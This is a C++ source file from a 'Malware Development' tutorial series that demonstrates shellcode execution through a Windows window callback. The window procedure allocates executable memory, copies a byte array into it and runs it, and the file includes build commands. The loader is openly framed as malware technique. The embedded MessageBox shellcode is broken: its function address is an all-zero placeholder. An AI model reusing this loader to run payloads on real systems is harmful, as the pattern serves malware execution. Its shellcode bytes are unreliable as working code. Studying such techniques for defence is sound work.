/*
Malware Development Part 14: Shellcode Injection via Window Callbacks
https://sid4hack.medium.com/shellcode-injection-via-window-callbacks-b33f7646c2bd
sudo apt update sudo apt install mingw-w64
x86_64-w64-mingw32-g++ -static -static-libgcc -static-libstdc++ -DUNICODE -D_UNICODE -mwindows shellcode_injection.cpp -o shellcode_injection.exe

Explanation
x86_64-w64-mingw32-g++: MinGW-w64 compiler for 64-bit Windows.
-static: Statically links all libraries to eliminate runtime dependencies.
-static-libgcc: Statically links the GCC runtime library.
-static-libstdc++: Statically links the C++ standard library.
-DUNICODE -D_UNICODE: Enables Unicode Windows APIs for compatibility.
-mwindows: Links the Windows GUI subsystem for window creation.
shellcode_injection.cpp: Source file (adjust if named differently).
-o shellcode_injection.exe: Output executable name.


*/

#include <windows.h>

// Simple shellcode to display a MessageBox (64-bit)
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28,              // sub rsp, 0x28
    0x48, 0x31, 0xC9,                    // xor rcx, rcx
    0x48, 0x8D, 0x15, 0x1E, 0x00, 0x00, 0x00, // lea rdx, [rel msg]
    0x4C, 0x8D, 0x05, 0x1F, 0x00, 0x00, 0x00, // lea r8, [rel title]
    0x48, 0x31, 0xC9,                    // xor rcx, rcx
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, MessageBoxA (placeholder)
    0xFF, 0xD0,                          // call rax
    0x48, 0x83, 0xC4, 0x28,              // add rsp, 0x28
    0xC3,                                // ret
    0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x57, 0x6F, 0x72, 0x6C, 0x64, 0x00, // "Hello World\0"
    0x54, 0x65, 0x73, 0x74, 0x00         // "Test\0"
};

// Window procedure
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static LPVOID shellcodeAddr = NULL;
    if (msg == WM_USER + 100) {
        shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!shellcodeAddr) {
            MessageBoxW(hwnd, L"Failed to allocate memory", L"Error", MB_OK | MB_ICONERROR);
            return 0;
        }
        memcpy(shellcodeAddr, shellcode, sizeof(shellcode));
        ((void(*)())shellcodeAddr)();
        VirtualFree(shellcodeAddr, 0, MEM_RELEASE);
        shellcodeAddr = NULL;
        return 0;
    }
    if (msg == WM_DESTROY) {
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Register window class
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"InjectWindow";
    if (!RegisterClassW(&wc)) {
        MessageBoxW(NULL, L"Failed to register window class", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Create window
    HWND hwnd = CreateWindowExW(0, L"InjectWindow", L"Shellcode Demo", WS_OVERLAPPEDWINDOW,
                               CW_USEDEFAULT, CW_USEDEFAULT, 400, 300,
                               NULL, NULL, hInstance, NULL);
    if (!hwnd) {
        MessageBoxW(NULL, L"Failed to create window", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Show window
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    // Trigger shellcode
    SendMessageW(hwnd, WM_USER + 100, 0, 0);

    // Message loop
    MSG msg = { 0 };
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return (int)msg.wParam;
}